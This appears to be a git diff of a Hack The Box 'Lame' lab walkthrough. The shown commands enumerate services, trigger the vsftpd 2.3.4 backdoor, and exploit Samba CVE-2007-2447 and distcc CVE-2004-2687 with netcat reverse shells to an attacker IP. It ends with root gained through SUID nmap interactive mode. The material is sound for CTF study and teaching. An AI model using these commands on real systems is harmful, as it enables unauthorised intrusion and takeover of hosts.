@@ -7,29 +7,30 @@
 
 ### Open Services
 
-To scan all open ports in WinterMute I run nmap with -p- options and enum service at each port.
++ vsftpd 2.3.4
++ Samba smbd 3.0.20-Debian
++ distccd v1 ((GNU) 4.2.4
 
-```
-┌──(Hades㉿10.10.14.5)-[0.3:12.3]~/scripting
-└─$ sudo ./enum/all.sh 10.10.10.3
-
+``` bash
 ### Port Scanning ############################
-nmap -sS -p- --min-rate 1000 10.10.10.3 | grep ^[0-9] | cut -d '/' -f1 | tr '\n' ',' | sed s/,$//
+nmap -sS -Pn -p- --min-rate 1000 10.10.10.3
+Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
 
 [+] Openning ports: 21,22,139,445,3632
 
 ### Services Enumeration ############################
 nmap -sC -sV -Pn 10.10.10.3 -p21,22,139,445,3632
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 11:07 EDT
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-04-27 15:38 +07
 Nmap scan report for 10.10.10.3
-Host is up (0.25s latency).
+Host is up (0.26s latency).
 
 PORT     STATE SERVICE     VERSION
 21/tcp   open  ftp         vsftpd 2.3.4
+|_ftp-anon: Anonymous FTP login allowed (FTP code 230)
 | ftp-syst: 
 |   STAT: 
 | FTP server status:
-|      Connected to 10.10.14.5
+|      Connected to 10.10.14.3
 |      Logged in as ftp
 |      TYPE: ASCII
 |      No session bandwidth limit
@@ -42,20 +43,20 @@ PORT     STATE SERVICE     VERSION
 | ssh-hostkey: 
 |   1024 60:0f:cf:e1:c0:5f:6a:74:d6:90:24:fa:c4:d5:6c:cd (DSA)
 |_  2048 56:56:24:0f:21:1d:de:a7:2b:ae:61:b1:24:3d:e8:f3 (RSA)
-139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)                                                                                                      
+139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
 3632/tcp open  distccd     distccd v1 ((GNU) 4.2.4 (Ubuntu 4.2.4-1ubuntu4))
 Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
 
 Host script results:
-|_clock-skew: mean: 2h14m22s, deviation: 2h49m46s, median: 14m19s
+|_clock-skew: mean: 2h01m51s, deviation: 2h49m45s, median: 1m49s
 | smb-os-discovery: 
 |   OS: Unix (Samba 3.0.20-Debian)
 |   Computer name: lame
 |   NetBIOS computer name: 
 |   Domain name: hackthebox.gr
 |   FQDN: lame.hackthebox.gr
-|_  System time: 2021-03-31T11:22:07-04:00
+|_  System time: 2021-04-27T04:40:35-04:00
 | smb-security-mode: 
 |   account_used: guest
 |   authentication_level: user
@@ -64,24 +65,14 @@ Host script results:
 |_smb2-time: Protocol negotiation failed (SMB2)
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
-Nmap done: 1 IP address (1 host up) scanned in 75.03 seconds
+Nmap done: 1 IP address (1 host up) scanned in 55.01 seconds
 ```
 
 ### vsftpd 2.3.4
 
-Anonymous access
+Login to ftp server using anonymous credential and got empty folder.
 
 ```
-┌──(Hades㉿10.10.14.4)-[2.1:15.9]~
-└─$ ftp 10.10.10.3
-Connected to 10.10.10.3.
-220 (vsFTPd 2.3.4)
-Name (10.10.10.3:kali): anonymous
-331 Please specify the password.
-Password:
-230 Login successful.
-Remote system type is UNIX.
-Using binary mode to transfer files.
 ftp> ls -la
 200 PORT command successful. Consider using PASV.
 150 Here comes the directory listing.
@@ -94,7 +85,7 @@ ftp> quit
 221 Goodbye.
 ```
 
-Searchsploit
+Search public exploit for `vsftpd 2.3.4`, there are an backdoor may can used for execute code.
 
 ```
 ┌──(Hades㉿10.10.14.4)-[2.7:16.6]~
@@ -109,9 +100,12 @@ Shellcodes: No Results
 
 ### Samba smbd 3.0.20-Debian
 
+Samba Server allows access to folder `tmp` with `READ, WRITE` permission.
+
 ```
 ### SMB Enumeration (445) ############################
-smbmap -H 10.10.10.3                                                                                                                                                        
+smbmap -H 10.10.10.3
+
 [+] IP: 10.10.10.3:445  Name: 10.10.10.3                                        
         Disk                                                    Permissions     Comment
         ----                                                    -----------     -------
@@ -132,7 +126,7 @@ Access to folder `tmp` using `smbclient` but the server disconnect this session.
 protocol negotiation failed: NT_STATUS_CONNECTION_DISCONNECTED
 ```
 
-Searchsploit
+Search public exploit for `Samba 3.0.20`, there are exploit execute command at Username in Samba Server.
 
 ```
 ┌──(Hades㉿10.10.14.5)-[0.7:13.5]~/walkthrough/hackthebox/lame
@@ -149,15 +143,12 @@ Shellcodes: No Results
 
 ### distccd v1 ((GNU) 4.2.4
 
-Check if it's vulnerable to CVE-2004-2687 to execute arbitrary code: [3632 - Pentesting distcc](https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc)
+Follow [3632 - Pentesting distcc](https://book.hacktricks.xyz/pentesting/3632-pentesting-distcc), Go to check if it's vulnerable to CVE-2004-2687 to execute arbitrary code
 
 ```
 ┌──(Hades㉿10.10.14.5)-[0.7:13.9]~
 └─$ sudo nmap -p 3632 10.10.10.3 --script distcc-cve2004-2687
-Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-31 22:17 EDT
-Nmap scan report for 10.10.10.3
-Host is up (0.25s latency).
-
+<snip>
 PORT     STATE SERVICE
 3632/tcp open  distccd
 | distcc-cve2004-2687: 
@@ -173,28 +164,30 @@ PORT     STATE SERVICE
 |     Extra information:
 |       
 |     uid=1(daemon) gid=1(daemon) groups=1(daemon)
-|   
-|     References:
-|       https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2004-2687
-|       https://nvd.nist.gov/vuln/detail/CVE-2004-2687
-|_      https://distcc.github.io/security.html
-
-Nmap done: 1 IP address (1 host up) scanned in 1.62 seconds
+<snip>
 ```
 
 ## Foothold
 
 ### vsftpd-2.3.4-exploit
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
-
-Base on `searchsploit`, we know the vsftpd 2.3.4 service had a critical vul allowing attacker to execute command in the server.
+Base on `searchsploit`, we know the vsftpd 2.3.4 might contain a backdoor which has been created by an intruder. The backdoor payload is initiated in response to a :) character combination in the username which represents a smiley face. The code sets up a bind shell listener on port 6200.
 
 ![](images/2.png)
 
-<a href='https://github.com/ahervias77/vsftpd-2.3.4-exploit' target="blank">Backdoor Command Execution</a>, this exploit trigger vsftpd 2.3.4 backdoor on port 6200 and prints supplied command's output. Payload: `USER letmein:)`.
+Trigger the backdoor and execute command `whoami`
 
-Execute payload
+``` bash
+┌──(Hades㉿10.10.14.3)-[2.4:20.4]~/walkthrough/hackthebox
+└─$ telnet 10.10.10.3 21
+<snip>
+220 (vsFTPd 2.3.4)
+USER hades:)
+331 Please specify the password.
+PASS leecybersec
+```
+
+Using script [vsftpd-2.3.4-exploit.py](https://github.com/ahervias77/vsftpd-2.3.4-exploit)
 
 ```
 python3 vsftpd-2.3.4-exploit.py 10.10.10.3 21 whoami
@@ -206,27 +199,23 @@ Check open port: 6200
 nmap -p 6200 10.10.10.3 -Pn
 ```
 
-![](images/3.png)
+Port 6200 is not open, may the developers removed the backdoor.
 
-Because port 6200 is not open, then we don't have a backdoor in Lame server.
+![](images/3.png)
 
 ### CVE-2007-2447
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
+Follow step exploit for <a href='https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation' target="blank">Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution</a>.
 
-<a href='https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation' target="blank">Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution</a>. The payload execute command \` in the username.
-
-Create a listener in Kali machine.
-
-``` bash
-sudo nc -nvlp 4444
-```
-
-Get reverse shell
+Execute command with \` in the username to get reverse shell.
 
 ```bash
 smbmap -u '/=`nc -e /bin/bash 10.10.14.4 4444`' -H 10.10.10.3
+```
 
+Using script [samba_rce_CVE-2007-2447.py](https://wiki.jacobshodd.com/writeups/hack-the-box/lame#exploitation)
+
+``` bash
 python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh'
 ```
 
@@ -234,40 +223,7 @@ python3 samba_rce_CVE-2007-2447.py 10.10.10.3 'nc -nv 10.10.14.5 443 -e /bin/sh'
 
 ### CVE-2004-2687
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
-
-Based on nmap script, I identify distcc-cve2004-2687 and search the public exploit <a href='https://gist.github.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855' target="blank">DistCC Daemon - Command Execution (Python)</a>
-
-Execute payload with ping command
-
-```
-┌──(Hades㉿10.10.14.4)-[1.5:16.3]~
-└─$ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "ping -c 2 10.10.14.4"
-[OK] Connected to remote service
-
---- BEGIN BUFFER ---
-
-PING 10.10.14.4 (10.10.14.4) 56(84) bytes of data.
-64 bytes from 10.10.14.4: icmp_seq=1 ttl=63 time=235 ms
-64 bytes from 10.10.14.4: icmp_seq=2 ttl=63 time=234 ms
-
---- 10.10.14.4 ping statistics ---
-2 packets transmitted, 2 received, 0% packet loss, time 1005ms
-rtt min/avg/max/mdev = 234.636/235.127/235.618/0.491 ms
-
-
---- END BUFFER ---
-
-[OK] Done.
-```
-
-Create a listener in Kali machine.
-
-``` bash
-sudo nc -nvlp 4444
-```
-
-Get reverse shell
+Based on nmap results, using exploit [distccd_rce_CVE-2004-2687.py](https://gist.githubusercontent.com/DarkCoderSc/4dbf6229a93e75c3bdf6b467e67a9855/raw/48ab4eb0bd69cac67bc97fbe182e39e5ded99f9f/distccd_rce_CVE-2004-2687.py) to get reverse shell in the server.
 
 ```bash
 python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 4444 -e /bin/sh"
@@ -277,21 +233,18 @@ python distccd_rce_CVE-2004-2687.py -t 10.10.10.3 -p 3632 -c "nc 10.10.14.64 444
 
 ## Privilege Escalation
 
-### Nmap SUID
+### Binaries That AutoElevate - Nmap
 
-[*Poc code here*](https://github.com/leecybersec/walkthrough/tree/master/hackthebox/lame)
-	
-Using [LinEnum.sh](https://github.com/rebootuser/LinEnum) to audit Lame server, I saw nmap had SUID.
-
-Exploit with [GTFOBins nmap](https://gtfobins.github.io/gtfobins/nmap/#shell)
+Server conatain command `nmap` allow execute as root
 
 ```
 daemon@lame:/tmp$ find / -perm -u=s -type f 2>/dev/null
 find / -perm -u=s -type f 2>/dev/null
 <snip>
 /usr/bin/nmap
-<snip>
 ```
+
+Exploit with [GTFOBins nmap](https://gtfobins.github.io/gtfobins/nmap/#shell)
 
 Check nmap version
 
@@ -305,14 +258,13 @@ Nmap version 4.53 (http://insecure.org)
 Execute nmap to get root
 
 ```
-daemon@lame:/root$ /usr/bin/nmap --interactive
+/bin/sh -i
 /usr/bin/nmap --interactive
-
-Starting Nmap V. 4.53 ( http://insecure.org )
-Welcome to Interactive Mode -- press h <enter> for help
 nmap> !sh
-!sh
-sh-3.2# whoami
-whoami
-root
 ```
+
+![](images/7.png)
+
+## Reference
+
+[https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable](https://www.hackingtutorials.org/metasploit-tutorials/exploiting-vsftpd-metasploitable)
